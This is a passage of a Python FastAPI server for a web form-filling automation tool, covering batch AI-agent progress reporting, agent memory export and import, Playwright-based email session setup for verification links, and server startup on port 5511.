                        if info.get("result", {}).get("missing_fields"):
                            missing = info["result"]["missing_fields"]
                            suggestions = info["result"].get("profile_suggestions", {})
                            await broadcast_message({
                                "type": "ai_agent_missing_fields",
                                "data": {
                                    "site": info.get("site"),
                                    "missing_count": len(missing),
                                    "missing_fields": [
                                        {
                                            "selector": f.get("selector"),
                                            "suggested_key": f.get("category") or f.get("profile_key"),
                                            "labels": f.get("labels", [])
                                        }
                                        for f in missing[:10]  # Limit to 10
                                    ],
                                    "suggestions": suggestions
                                }
                            })

                    # Handle missing field notifications from crew
                    elif info.get("type") == "missing_field":
                        await broadcast_message({
                            "type": "ai_agent_missing_field",
                            "data": info
                        })

                    ai_agent_state["current_site"] = info.get("site")

                    # Send via WebSocket
                    await broadcast_message({
                        "type": "ai_agent_progress",
                        "data": {
                            **info,
                            "progress": ai_agent_state["progress"]
                        }
                    })

                # SeleniumBase agent uses sequential processing for stability
                ai_agent_state["parallel"] = False
                result = await agent.fill_sites(urls, profile_data, on_progress=on_progress)

                await broadcast_message({
                    "type": "ai_agent_batch_complete",
                    "data": result
                })

            except Exception as e:
                logger.error(f"Batch AI agent error: {e}", exc_info=True)
                await broadcast_message({
                    "type": "ai_agent_error",
                    "data": {"error": str(e)}
                })
            finally:
                ai_agent_state["running"] = False
                ai_agent_state["current_site"] = None
                ai_agent_state["active_agents"] = 0
                ai_agent_state["parallel"] = False

        # Run in background
        task_id = str(uuid.uuid4())[:8]
        ai_agent_state["task_id"] = task_id
        background_tasks.add_task(run_batch)

        return JSONResponse(content={
            "success": True,
            "message": f"AI agent started for {len(urls)} sites",
            "total_sites": len(urls),
            "task_id": task_id
        })

    except Exception as e:
        logger.error(f"AI agent batch error: {e}", exc_info=True)
        return JSONResponse(
            status_code=500,
            content={"success": False, "error": str(e)}
        )

@app.post("/api/ai-agent/stop")
async def stop_ai_agent():
    """Stop the running AI agent"""
    global ai_agent_state
    ai_agent_state["running"] = False
    return JSONResponse(content={"success": True, "message": "Stop signal sent"})

@app.get("/api/ai-agent/memory/stats")
async def get_ai_memory_stats():
    """Get AI agent learning statistics"""
    try:
        from tools.agent_memory import AgentMemory
        memory = AgentMemory()
        return JSONResponse(content=memory.get_stats())
    except Exception as e:
        return JSONResponse(
            status_code=500,
            content={"error": str(e)}
        )

@app.get("/api/ai-agent/memory/export")
async def export_ai_memory():
    """Export learned data for backup"""
    try:
        from tools.agent_memory import AgentMemory
        memory = AgentMemory()
        return JSONResponse(content=memory.export_learning())
    except Exception as e:
        return JSONResponse(
            status_code=500,
            content={"error": str(e)}
        )

@app.post("/api/ai-agent/memory/import")
async def import_ai_memory(data: dict):
    """Import learned data from backup"""
    try:
        from tools.agent_memory import AgentMemory
        memory = AgentMemory()
        memory.import_learning(data)
        return JSONResponse(content={"success": True, "message": "Learning data imported"})
    except Exception as e:
        return JSONResponse(
            status_code=500,
            content={"success": False, "error": str(e)}
        )


# ============================================================================
# EMAIL VERIFICATION ENDPOINTS
# ============================================================================

EMAIL_SESSION_FILE = Path("data/email_session.json")
EMAIL_PROVIDERS = {
    "gmail": "https://mail.google.com",
    "outlook": "https://outlook.live.com",
    "yahoo": "https://mail.yahoo.com",
}

@app.get("/api/email/status")
async def get_email_status():
    """Get email session status."""
    has_session = EMAIL_SESSION_FILE.exists()
    return {
        "hasSession": has_session,
        "providers": list(EMAIL_PROVIDERS.keys())
    }

@app.post("/api/email/setup")
async def setup_email_session(request: Request):
    """Launch browser for user to sign into email."""
    try:
        data = await request.json()
        provider = data.get("provider", "gmail")
        url = EMAIL_PROVIDERS.get(provider.lower(), EMAIL_PROVIDERS["gmail"])

        from playwright.async_api import async_playwright

        # Launch visible browser
        pw = await async_playwright().start()
        browser = await pw.chromium.launch(headless=False)
        context = await browser.new_context()
        page = await context.new_page()

        # Navigate to email
        await page.goto(url)

        # Store reference for later saving
        global _email_browser, _email_context
        _email_browser = browser
        _email_context = context

        return {
            "success": True,
            "message": f"Browser opened to {provider}. Sign in, then click 'Save Session'.",
            "provider": provider,
            "url": url
        }
    except Exception as e:
        return JSONResponse(
            status_code=500,
            content={"success": False, "error": str(e)}
        )

@app.post("/api/email/save-session")
async def save_email_session():
    """Save the current email browser session."""
    try:
        global _email_browser, _email_context

        if not _email_context:
            return JSONResponse(
                status_code=400,
                content={"success": False, "error": "No browser session to save. Run setup first."}
            )

        # Save session state
        EMAIL_SESSION_FILE.parent.mkdir(parents=True, exist_ok=True)
        await _email_context.storage_state(path=str(EMAIL_SESSION_FILE))

        # Close browser
        await _email_browser.close()
        _email_browser = None
        _email_context = None

        return {"success": True, "message": "Email session saved successfully!"}
    except Exception as e:
        return JSONResponse(
            status_code=500,
            content={"success": False, "error": str(e)}
        )

@app.post("/api/email/verify")
async def verify_email(request: Request):
    """Open email to check for verification messages."""
    try:
        data = await request.json()
        search_term = data.get("searchTerm", "")

        if not EMAIL_SESSION_FILE.exists():
            return JSONResponse(
                status_code=400,
                content={"success": False, "error": "No email session. Set up email first."}
            )

        from playwright.async_api import async_playwright

        pw = await async_playwright().start()
        browser = await pw.chromium.launch(headless=False)
        context = await browser.new_context(storage_state=str(EMAIL_SESSION_FILE))
        page = await context.new_page()

        # Go to Gmail
        await page.goto("https://mail.google.com")

        # Search for verification emails if search term provided
        if search_term:
            try:
                import asyncio
                await asyncio.sleep(3)  # Wait for page load
                search_box = page.locator('input[aria-label="Search mail"]')
                await search_box.fill(f"{search_term} verify")
                await search_box.press("Enter")
            except:
                pass

        # Store browser reference for later closing
        global _verify_browser
        _verify_browser = browser

        return {
            "success": True,
            "message": "Email opened. Find and click verification links, then close browser."
        }
    except Exception as e:
        return JSONResponse(
            status_code=500,
            content={"success": False, "error": str(e)}
        )

@app.post("/api/email/clear-session")
async def clear_email_session():
    """Clear saved email session."""
    try:
        if EMAIL_SESSION_FILE.exists():
            EMAIL_SESSION_FILE.unlink()
        return {"success": True, "message": "Email session cleared"}
    except Exception as e:
        return JSONResponse(
            status_code=500,
            content={"success": False, "error": str(e)}
        )

# Global browser references for email
_email_browser = None
_email_context = None
_verify_browser = None

MODE = os.getenv("MODE", "web")

if __name__ == "__main__":
    if MODE == "worker":
        from core.worker import main as worker_main
        print("Running in worker mode")
        asyncio.run(worker_main())
    else:
        import webbrowser
        import threading
        import time

        # Show startup and scan hardware
        print("Initializing KPR...\n")
        hardware_caps = scan_hardware_capabilities()

        print("Server starting on http://localhost:5511")
        print("Close this window to stop FormAI\n")

        def open_browser():
            """Open browser after a short delay"""
            time.sleep(1)  # Short delay for server to start
            try:
                webbrowser.open("http://localhost:5511")
            except:
                pass  # Silently fail if browser can't open

        # Start browser in background thread
        threading.Thread(target=open_browser, daemon=True).start()

        # Run the server (when terminal closes, this exits and server stops)
        # Try LAN IP for remote admin access, fallback to localhost if binding fails
        import socket

        def get_lan_ip():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect(("8.8.8.8", 80))
                ip = s.getsockname()[0]
                s.close()
                return ip
            except:
                return None

        def test_bind(host, port):
            """Test if we can bind to this address"""
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.bind((host, port))
                s.close()
                return True
            except:
                return False

        # Bind to 0.0.0.0 to accept connections from both localhost and LAN
        lan_ip = get_lan_ip()
        host_ip = "0.0.0.0"
        if lan_ip:
            print(f"Binding to 0.0.0.0:5511 (localhost + LAN at {lan_ip})")
        else:
            print(f"Binding to 0.0.0.0:5511 (all interfaces)")

        uvicorn.run(
            app,
            host=host_ip,
            port=5511,
            log_level="info"
        )
